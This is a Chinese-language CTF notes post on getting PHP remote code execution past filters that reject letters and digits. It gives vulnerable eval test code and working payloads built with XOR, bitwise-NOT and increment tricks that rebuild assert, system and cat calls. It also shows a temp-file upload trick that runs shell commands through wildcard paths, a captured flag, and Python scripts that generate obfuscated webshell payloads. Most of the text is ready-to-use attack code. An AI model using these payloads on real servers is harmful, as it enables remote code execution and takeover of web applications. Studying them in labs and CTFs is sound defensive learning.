版本为php5

 

php5中assert是一个函数，我们可以通过`$f='assert';$f(...);`这样的方法来动态执行任意代码。

 

但php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用file_put_contents函数，同样可以用来getshell。

 

# **无数字和字母rce**

 

测试代码

 

```
<?php

if(!preg_match('/[a-z0-9]/is',$_GET['shell'])) {

 eval($_GET['shell']);

}
```

 

```
<?php
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']');$___=$$__;$_($___[_]);
```

在这里面经过url编码的字符能够绕过

所以%01这些不会被匹配

 

```
<?php

$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');//$_='assert';

$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); // $__='_POST';

$___=$$__;

$_($___[_]); //所有的合起来就是 assert($_POST[_]);

 
```

payload

 

```
http://127.0.0.1/test/p.php?shell=$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']');$___=$$__;$_($___[_]);
```

 

还要post一个参数

_=phpinfo();

![image-20210808135044128](images/1.png)

 

 

同理

```
_=print_r(scandir('/'));可以直接获取根目录了

_=print_r(scandir(getcwd()));

```

 

 

参考链接:https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html

 

 

对于linux中的shell是支持正则表达式的，当你忘记某些字符时可以通过? % *来代替

所以我们要执行一个命令的话可以直接用?替代

而且大多数服务器都是用的linux

直接在kali里面实验了

 

不过用这种方法rce 的话需要上传一个临时文件

```
<!DOCTYPE html>

<html lang="en">

<head>

    <meta charset="UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <title>POST数据包POC</title>

</head>

<body>

<form action="http://" method="post" enctype="multipart/form-data">

<!--链接是当前打开的题目链接-->

  <label for="file">文件名：</label>

  <input type="file" name="file" id="file"><br>

  <input type="submit" name="submit" value="提交">

</form>

</body>

</html>
```

 

在这个文件下写入需要调用的命令

```
#!/bin/sh

ls
```

意思是调用ls命令

当然肯定还是要先获取文件内容我们默认上传的文件会保存在/tmp目录下

命名为/tmp/phpxxxxxx

利用``内$会解析的特性,通过位运算,执行系统命令

`[@-[]`是linux下面的匹配符，是进行匹配的大写字母。

所以

```
shell=?><?=`. /???/????????[@-[]`;?>
```

 用+代替空格绕过

![image-20210526181234816](images/2.png)

抓包修改文件内容就可以任意命令执行了

不过不知道为什么有时候有有时候没有,记得多刷新几次

 

参考链接:https://www.freebuf.com/articles/web/186298.html

 

# **无字母rce**

 

测试代码

```
 
<?php

show_source(__FILE__);

$mess=$_POST['mess'];

if(preg_match("/[a-zA-Z]/",$mess)){

  die("invalid input!");

}

eval($mess);
```

 

![image-20210808134559028](images/3.png)

读取到了当前同一个目录下的p.php

```
mess=?><?=$_="3317!315288"^"@[^@~@^@@[]";$_(("0"^"@").(".").("030"^"@[@"));
```

这串字符串的意思是show_source(p.php)

不过是需要异或运算后

这里有个异或运算脚本

 

```
valid = "1234567890!@$%^*(){}[];\'\",.<>/?-=_`~ "

answer = "show_source"

tmp1, tmp2 = '', ''
for c in answer:
  for i in valid:
    for j in valid:
      if (ord(i) ^ ord(j) == ord(c)):
        tmp1 += i
        tmp2 += j
        break
    else:
      continue
    break
print(tmp1, tmp2)
```

除此之外也可以用上面的方法

Url:

```
http://127.0.0.1/test/p.php?shell=$_=(''^'').(''^'').(''^'');$__='_'.(' '^']').('%2F'^'`').(''^']').('	'^']');$___=$$__;$_($___[_]);
```

 

post数据:

```
mess=$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']');$___=$$__;$_($___[_]);&_=phpinfo();
```

当然我肯定先用glob()看看当前目录有什么东西

![image-20210808140427356](images/4.png)

穿越到上级目录就用../

![image-20210808140352943](images/5.png)

```
mess=$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']');$___=$$__;$_($___[_]);&_=print_r(show_source('p.php'));
```

![image-20210808140549044](images/6.png)



```
思路一：绕过字符和数字
code=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
1.成功 preg_match("/[A-Za-z0-9]+/",$code)
2.失败 preg_match("/[A-Za-z0-9_@]+/",$code)
3.失败 preg_match("/[A-Za-z0-9_$@]+/",$code)

思路二：绕过字符和数字+下划线（变量_和__）
code=${"`{{{"^"?<>/"}['+']();
1.成功 preg_match("/[A-Za-z0-9]+/",$code)
2.成功 preg_match("/[A-Za-z0-9_@]+/",$code)
3.失败 preg_match("/[A-Za-z0-9_$@]+/",$code)
- ?code=${"`{{{"^"?<>/"}['+']();&+=getFlag
- ?code=${"`{{{"^"?<>/"}['+']();&_=assert&__=print_r(`scandir`('/'))

思路三：绕过字符和数字+下划线（变量_和__）+美元符号（$）
1.均失败

------------------------------------------------------

【最终答案】
思路四：采用通配符绕过美元符号（$）
?code=?><?=`/???/??? /????`?>
?code=?%3E%3C?=`/???/???%20/????`?%3E

Cflag{h76ghpt2v2JiYEKzBQ5ysxu9b2Z3mN4A} 
```

取反绕过:

```
<?php
$a = "system";
$b= "cat /flllllaaaaaaggggggg";
echo urlencode(~$a);
echo "\n";
echo urlencode(~$b);
```

payload还要加上取反

```
?shell=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98);
```

```
$_=[];$_=@"$_";$_=$_["!"=="@"];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);
```



```
$_=[];$_="$_";$_=$_[1==1];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);
```



```
$_=
[];$_=@"$_";$_=$_["!"=="@"];$___=$_;$__=$_;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$___.=$__;$___.=$__;$__=$_;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$___.=$__;$__=$_;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$___.=$__;$__=$_;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$___.=$__;$____='_';$__=$_;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$____.=$__;$__=$_;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$____.=$__;$__=$_;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$____.=$__;$__=$_;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$____.=$__;$_=$$____;$___($_[_]);
```

国外某比赛通过异或rce

https://ljdd520.github.io/2021/01/28/TetCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/

脚本如下

```
import urllib.parse

class WebShell(object):
    def __init__(self, chars, payload):
        self.chars = chars
        self.payload = payload
        self.dic = self.shell()

    def shell(self):
        dic = {}
        for i in range(0, len(self.chars)):
            for j in range(0, len(self.chars)):
                for k in range(0, len(self.chars)):
                    temp = self.chars[i] + self.chars[j] + self.chars[k]
                    result = chr(ord(self.chars[i]) ^ ord(self.chars[j]) ^ ord(self.chars[k]))
                    dic[temp] = result
        return dic

    def get_shell(self):
        str1 = ''
        str2 = ''
        str3 = ''
        for i in range(0, len(self.payload)):
            for j in self.dic:
                if self.dic[j] == self.payload[i]:
                    str1 = str1 + j[0]
                    str2 = str2 + j[1]
                    str3 = str3 + j[2]
                    break

        result = '\'' + str1 + '\'' + '^' + '\'' + str2 + '\'' + '^' + '\'' + str3 + '\''
        return result

    def url_encode_shell(self):
        return urllib.parse.quote(self.get_shell())

    def url_decode_shell(self):
        return urllib.parse.unquote(self.url_encode_shell())


if __name__ == '__main__':
    chars = r"0123456789+-*/().~^|&"
    payload = r"eval($_GET[1])"
    webShell = WebShell(chars, payload)
    result = webShell.get_shell()
    print(result)
    print(webShell.url_encode_shell())
    print(webShell.url_decode_shell())

"""
'00040000020000'^'+8-~021)+85030'^'~~|&(&^^^^^1^)'
%2700040000020000%27%5E%27%2B8-~021%29%2B85030%27%5E%27~~%7C%26%28%26%5E%5E%5E%5E%5E1%5E%29%27
'00040000020000'^'+8-~021)+85030'^'~~|&(&^^^^^1^)'
"""
```

